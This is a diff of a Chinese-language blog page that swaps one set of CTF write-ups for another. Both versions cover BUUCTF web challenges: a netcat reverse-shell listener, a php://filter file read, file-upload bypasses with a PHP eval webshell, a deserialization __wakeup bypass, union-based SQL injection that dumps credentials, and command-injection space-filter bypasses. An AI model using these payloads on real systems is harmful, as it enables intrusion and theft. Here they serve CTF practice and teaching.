@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="代码审计, Y1ng0&#39;s blog">
+    <meta name="keywords" content="Y1ng0&#39;s blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>代码审计 | Y1ng0&#39;s blog</title>
+    <title>Y1ng0&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -222,12 +222,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">代码审计</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -348,15 +348,6 @@
                 </div>
                 <div class="col s5 right-align">
                     
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/ctf/" class="post-category">
-                                ctf
-                            </a>
-                        
-                    </div>
-                    
                 </div>
             </div>
 
@@ -364,7 +355,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-04-10
+                    2021-04-12
                 </div>
                 
 
@@ -385,45 +376,98 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="veryphp-ctf-show"><a href="#veryphp-ctf-show" class="headerlink" title="veryphp-ctf show"></a>veryphp-ctf show</h2><p><img src="/medias/pictures/24.png"></p>
-<p>显而易见，先对post的变量进行过滤，</p>
-<p>过滤掉“,_,.,%,*,~,^,”,:,(,),g,e,l,i,”</p>
-<p>因为变量名含有“_”，所以将其转变，在php语言中用‘+’，‘ ’，‘[’等表示</p>
-<p>然后对变量值进行正则匹配并限制字符长度为29</p>
-<p>利用burp修改：</p>
-<p>$shaw[root=-a9<b>xxxxxx&gt;&gt;&gt;&gt;zzabcdphp@Rsx</p>
-<p><img src="/medias/pictures/25.png"></p>
-<p>得到mint：</p>
-<p><img src="/medias/pictures/1617947876645.png"></p>
-<p>1.在线爆破MD5</p>
-<p>2.脚本</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$SecretNumber</span>=<span class="number">10000</span>;<span class="variable">$SecretNumber</span>&lt;<span class="number">99999</span>;<span class="variable">$SecretNumber</span>++)</span><br><span class="line">&#123; <span class="variable">$str</span> = <span class="string">&quot;shaw&quot;</span>.(<span class="variable">$SecretNumber</span>).<span class="string">&quot;root&quot;</span>; </span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$str</span>) == <span class="string">&quot;166b47a5cb1ca2431a0edfcef200684f&quot;</span>)   </span><br><span class="line">&#123;   <span class="keyword">echo</span> <span class="variable">$SecretNumber</span>;   </span><br><span class="line"> 	<span class="keyword">exit</span>;   </span><br><span class="line">&#125; </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+                <h1 id="V-amp-N2020-公开赛-CHECKIN"><a href="#V-amp-N2020-公开赛-CHECKIN" class="headerlink" title="[V&amp;N2020 公开赛]CHECKIN"></a>[V&amp;N2020 公开赛]CHECKIN</h1><p><img src="/medias/pictures/1618128660534.png" alt="1618128660534"></p>
+<p>首先反弹shell：</p>
+<p>先开一台靶机：查看ip</p>
+<p><img src="/medias/pictures/1618128721065.png" alt="1618128721065"></p>
+<p>监听端口：</p>
+<p>nc -lvp 1111</p>
+<p>构造payload:</p>
+<p><img src="/medias/pictures/1618128755405.png" alt="1618128755405"></p>
+<p>反弹成功后查看flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;porc&#x2F;*&#x2F;fd&#x2F;*</span><br></pre></td></tr></table></figure>
 
-<p>进入最后一层，要我们传入<code>$my_ans</code> 利用call_user_func来调用类里面的方法，因为oao方法下存在着<code>show_source(&quot;config.php&quot;);</code>则为<code>qwq::oao</code> </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaw root&#x3D;a9&lt;b&gt;xxxxxx&gt;&gt;&gt;&gt;zzabcdphp@Rsx&amp;ans&#x3D;21475&amp;my ans&#x3D;qwq::oao</span><br></pre></td></tr></table></figure>
+<p>可以查询没有关掉就直接删除的文件</p>
+<h1 id="BJDCTF-2nd-elementmaster"><a href="#BJDCTF-2nd-elementmaster" class="headerlink" title="[BJDCTF 2nd]elementmaster"></a>[BJDCTF 2nd]elementmaster</h1><p><img src="/medias/pictures/1618134146946.png" alt="1618134146946"></p>
+<p><img src="/medias/pictures/1618134249993.png" alt="1618134249993"></p>
+<p>思路：遍历元素周期表，输出能访问的页面，贴出脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://5b852cf3-21e8-4790-8ce8-e9934b52905a.node3.buuoj.cn/&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">element = [<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;He&#x27;</span>, <span class="string">&#x27;Li&#x27;</span>, <span class="string">&#x27;Be&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;Ne&#x27;</span>, <span class="string">&#x27;Na&#x27;</span>, <span class="string">&#x27;Mg&#x27;</span>, <span class="string">&#x27;Al&#x27;</span>, <span class="string">&#x27;Si&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;Cl&#x27;</span>, <span class="string">&#x27;Ar&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Ca&#x27;</span>, <span class="string">&#x27;Sc&#x27;</span>, <span class="string">&#x27;Ti&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;Cr&#x27;</span>, <span class="string">&#x27;Mn&#x27;</span>, <span class="string">&#x27;Fe&#x27;</span>, <span class="string">&#x27;Co&#x27;</span>, <span class="string">&#x27;Ni&#x27;</span>, <span class="string">&#x27;Cu&#x27;</span>, <span class="string">&#x27;Zn&#x27;</span>, <span class="string">&#x27;Ga&#x27;</span>, <span class="string">&#x27;Ge&#x27;</span>, <span class="string">&#x27;As&#x27;</span>, <span class="string">&#x27;Se&#x27;</span>, <span class="string">&#x27;Br&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;Kr&#x27;</span>, <span class="string">&#x27;Rb&#x27;</span>, <span class="string">&#x27;Sr&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Zr&#x27;</span>, <span class="string">&#x27;Nb&#x27;</span>, <span class="string">&#x27;Mo&#x27;</span>, <span class="string">&#x27;Te&#x27;</span>, <span class="string">&#x27;Ru&#x27;</span>, <span class="string">&#x27;Rh&#x27;</span>, <span class="string">&#x27;Pd&#x27;</span>, <span class="string">&#x27;Ag&#x27;</span>, <span class="string">&#x27;Cd&#x27;</span>, <span class="string">&#x27;In&#x27;</span>, <span class="string">&#x27;Sn&#x27;</span>, <span class="string">&#x27;Sb&#x27;</span>, <span class="string">&#x27;Te&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;Xe&#x27;</span>, <span class="string">&#x27;Cs&#x27;</span>, <span class="string">&#x27;Ba&#x27;</span>, <span class="string">&#x27;La&#x27;</span>, <span class="string">&#x27;Ce&#x27;</span>, <span class="string">&#x27;Pr&#x27;</span>, <span class="string">&#x27;Nd&#x27;</span>, <span class="string">&#x27;Pm&#x27;</span>, <span class="string">&#x27;Sm&#x27;</span>, <span class="string">&#x27;Eu&#x27;</span>, <span class="string">&#x27;Gd&#x27;</span>, <span class="string">&#x27;Tb&#x27;</span>, <span class="string">&#x27;Dy&#x27;</span>, <span class="string">&#x27;Ho&#x27;</span>, <span class="string">&#x27;Er&#x27;</span>, <span class="string">&#x27;Tm&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;Yb&#x27;</span>, <span class="string">&#x27;Lu&#x27;</span>, <span class="string">&#x27;Hf&#x27;</span>, <span class="string">&#x27;Ta&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;Re&#x27;</span>, <span class="string">&#x27;Os&#x27;</span>, <span class="string">&#x27;Ir&#x27;</span>, <span class="string">&#x27;Pt&#x27;</span>, <span class="string">&#x27;Au&#x27;</span>, <span class="string">&#x27;Hg&#x27;</span>, <span class="string">&#x27;Tl&#x27;</span>, <span class="string">&#x27;Pb&#x27;</span>, <span class="string">&#x27;Bi&#x27;</span>, <span class="string">&#x27;Po&#x27;</span>, <span class="string">&#x27;At&#x27;</span>, <span class="string">&#x27;Rn&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;Fr&#x27;</span>, <span class="string">&#x27;Ra&#x27;</span>, <span class="string">&#x27;Ac&#x27;</span>, <span class="string">&#x27;Th&#x27;</span>, <span class="string">&#x27;Pa&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;Np&#x27;</span>, <span class="string">&#x27;Pu&#x27;</span>, <span class="string">&#x27;Am&#x27;</span>, <span class="string">&#x27;Cm&#x27;</span>, <span class="string">&#x27;Bk&#x27;</span>, <span class="string">&#x27;Cf&#x27;</span>, <span class="string">&#x27;Es&#x27;</span>, <span class="string">&#x27;Fm&#x27;</span>,<span class="string">&#x27;Md&#x27;</span>, <span class="string">&#x27;No&#x27;</span>, <span class="string">&#x27;Lr&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;Rf&#x27;</span>, <span class="string">&#x27;Db&#x27;</span>, <span class="string">&#x27;Sg&#x27;</span>, <span class="string">&#x27;Bh&#x27;</span>, <span class="string">&#x27;Hs&#x27;</span>, <span class="string">&#x27;Mt&#x27;</span>, <span class="string">&#x27;Ds&#x27;</span>, <span class="string">&#x27;Rg&#x27;</span>, <span class="string">&#x27;Cn&#x27;</span>, <span class="string">&#x27;Nh&#x27;</span>, <span class="string">&#x27;Fl&#x27;</span>, <span class="string">&#x27;Mc&#x27;</span>, <span class="string">&#x27;Lv&#x27;</span>, <span class="string">&#x27;Ts&#x27;</span>, <span class="string">&#x27;Og&#x27;</span>, <span class="string">&#x27;Uue&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> element:</span><br><span class="line">    res = requests.get(url+i+<span class="string">&#x27;.php&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        flag = flag+res.text</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/medias/pictures/1617952427520.png"></p>
+<p>得到路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/medias/pictures/1618134584268.png" alt="1618134584268"></p>
+<h1 id="BJDCTF-2nd-文件探测"><a href="#BJDCTF-2nd-文件探测" class="headerlink" title="[BJDCTF 2nd]文件探测"></a>[BJDCTF 2nd]文件探测</h1><p>任意文件读取：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload.php</span><br></pre></td></tr></table></figure>
+
+<p>过滤器：convert.base64-encode</p>
+<p>resource=upload.php 读取upload.php的内容</p>
+<p>SOAP：简单对象访问协议</p>
+<p>​        被设计成在web上交换结构化的和固化的信息</p>
+<p>​        包括http、smtp（简单邮件传输协议）、mime（多用途网际邮件扩充协议）</p>
+<p>​        通常代表利用xml、http实现webservice服务的接口</p>
+<h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p><img src="/medias/pictures/1618150549268.png" alt="1618150549268"></p>
+<p>文件上传漏洞，burp改后缀</p>
+<p><img src="/medias/pictures/1618150786264.png" alt="1618150786264"></p>
+<p>php后缀报错，尝试phtml、PHP2、php3、php4</p>
+<p><img src="/medias/pictures/1618150835412.png" alt="1618150835412"></p>
+<p>蚁剑链接：</p>
+<p><img src="/medias/pictures/1618150861756.png" alt="1618150861756"></p>
+<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p><img src="/medias/pictures/1618151455140.png" alt="1618151455140"></p>
+<p>重复操作：</p>
+<p><img src="/medias/pictures/1618151506107.png" alt="1618151506107"></p>
+<p>这次<code>过滤了   &lt;</code>：</p>
+<p>换个一句话木马：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? &lt;script language&#x3D;&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/medias/pictures/1618151547129.png" alt="1618151547129"></p>
+<p>蚁剑链接:</p>
+<p><img src="/medias/pictures/1618151590095.png" alt="1618151590095"></p>
+<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p><img src="/medias/pictures/1618153012401.png" alt="1618153012401"></p>
+<p>扫目录，找备份：</p>
+<p><img src="/medias/pictures/1618152977325.png" alt="1618152977325"></p>
+<p>打开下载的index.php和class.php:</p>
+<p><img src="/medias/pictures/1618199995059.png" alt="1618199995059"></p>
+<p><img src="/medias/pictures/1618153224732.png" alt="1618153224732"></p>
+<p>审计代码可知:</p>
+<p>get参数select=<code>username=admin,password=100</code>,即可输出flag</p>
+<h5 id="首先构造序列化"><a href="#首先构造序列化" class="headerlink" title="首先构造序列化:"></a>首先构造序列化:</h5><p><img src="/medias/pictures/1618198873184.png" alt="1618198873184"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="跳过-wakeup"><a href="#跳过-wakeup" class="headerlink" title="跳过_wakeup()"></a>跳过_wakeup()</h5><p><code>属性个数的值大于实际属性个数时,会跳过_wakeup()函数的执行</code></p>
+<p>可以将上述序列化字符串属性个数的值加一</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="修改private声明"><a href="#修改private声明" class="headerlink" title="修改private声明"></a>修改private声明</h5><p><code>private声明的字段为私有字段</code>,该类的子类和该类的对象实例中均不可见</p>
+<p>所以私有字段的字段名在序列化时,类名和字段名前面都会加上0的前缀,字符串长度也包括所加前缀的长度</p>
+<p>所以修改序列化字符串,加上%00:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/medias/pictures/1618200081288.png" alt="1618200081288"></p>
 <p>得到flag</p>
-<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p><img src="/medias/pictures//image-20210409035053052.png"></p>
-<p>尝试后发现没有过滤，直接burp抓包，构建payload</p>
-<p><img src="/medias/pictures/image-20210409035159727.png"></p>
-<p>得到flag</p>
-<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p><img src="/medias/pictures/image-20210409052829194.png"></p>
-<p>和上题类似，同样是命令注入</p>
-<p><img src="/medias/pictures/image-20210409052807701.png"></p>
-<p>但构建payload时发现进行了过滤，空格不被识别</p>
-<p>bash命令绕过空格过滤：</p>
-<pre><code>1. &lt;&gt;
- 2. %20(空格的url编码)
- 3. %09(tab的url编码)
- 4. $IFS$1    $&#123;IFS&#125;     $IFS                  在shell中$IFS用于内部字段分隔符
-</code></pre>
-<p><img src="/medias/pictures/image-20210409054240977.png"></p>
-<p>过滤比较齐全，下面直接放出payload：</p>
-<p><img src="/medias/pictures/image-20210409054420592.png"></p>
-<p>查看源代码：</p>
-<p><img src="/medias/pictures/image-20210409054438449.png"></p>
-<p>得到flag</p>
+<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p><img src="/medias/pictures/1618205123071.png" alt="1618205123071"></p>
+<p>直接联合查询注入:</p>
+<h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e026841a-ee44-4874-8cc2-9c8390c0567a.node3.buuoj.cn&#x2F;check.php</span><br><span class="line">?username&#x3D;0&#39;</span><br><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() </span><br><span class="line"> --+&#39;&amp;password&#x3D;1 #</span><br></pre></td></tr></table></figure>
+
+<p><img src="/medias/pictures/1618205232711.png" alt="1618205232711"></p>
+<h5 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e026841a-ee44-4874-8cc2-9c8390c0567a.node3.buuoj.cn&#x2F;check.php</span><br><span class="line">?username&#x3D;0&#39;</span><br><span class="line">union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;</span><br><span class="line"> --+&#39;&amp;password&#x3D;1 #</span><br></pre></td></tr></table></figure>
+
+<p><img src="/medias/pictures/1618205741620.png" alt="1618205741620"></p>
+<h5 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e026841a-ee44-4874-8cc2-9c8390c0567a.node3.buuoj.cn&#x2F;check.php</span><br><span class="line">?username&#x3D;0&#39;</span><br><span class="line">union select 1,2,group_concat(id,username,password) from l0ve1ysq1</span><br><span class="line"> --+&#39;&amp;password&#x3D;1 #</span><br></pre></td></tr></table></figure>
+
+<p>得到flag:</p>
+<p><img src="/medias/pictures/1618205954130.png" alt="1618205954130"></p>
+<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p><img src="/medias/pictures/1618195775394.png" alt="1618195775394"></p>
+<p>御剑扫描备份文件:</p>
+<p><img src="/medias/pictures/1618195926773.png" alt="1618195926773"></p>
+<p>审计代码:</p>
+<p><img src="/medias/pictures/1618195983755.png" alt="1618195983755"></p>
+<p>GET传入$key参数,<code>intval()</code>将其转化成整型</p>
+<p><code>&quot;==&quot; 弱类型比较</code>,$str也会被转化成整型</p>
+<p>只需要$key=123</p>
+<p><img src="/medias/pictures/1618196378086.png" alt="1618196378086"></p>
 
                 
             </div>
@@ -450,7 +494,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/04/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">http://example.com/2021/04/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</a>
+                    <a href="http://example.com/2021/04/12/2021-4-11%20%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DCHECKIN%20230825/">http://example.com/2021/04/12/2021-4-11%20%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DCHECKIN%20230825/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -657,9 +701,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
                 <a href="/2021/04/12/2021-4-11%20%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DCHECKIN%20230825/">
                     <div class="card-image">
@@ -677,9 +722,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -688,6 +733,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -698,13 +744,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/04/08/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/">
+                <a href="/2021/04/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="人工智能之线性回归-预测房价">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="代码审计">
                         
-                        <span class="card-title">人工智能之线性回归-预测房价</span>
+                        <span class="card-title">代码审计</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -715,14 +761,14 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-08
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-10
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/python/" class="post-category">
-                                    python
+                            <a href="/categories/ctf/" class="post-category">
+                                    ctf
                                 </a>
                             
                             
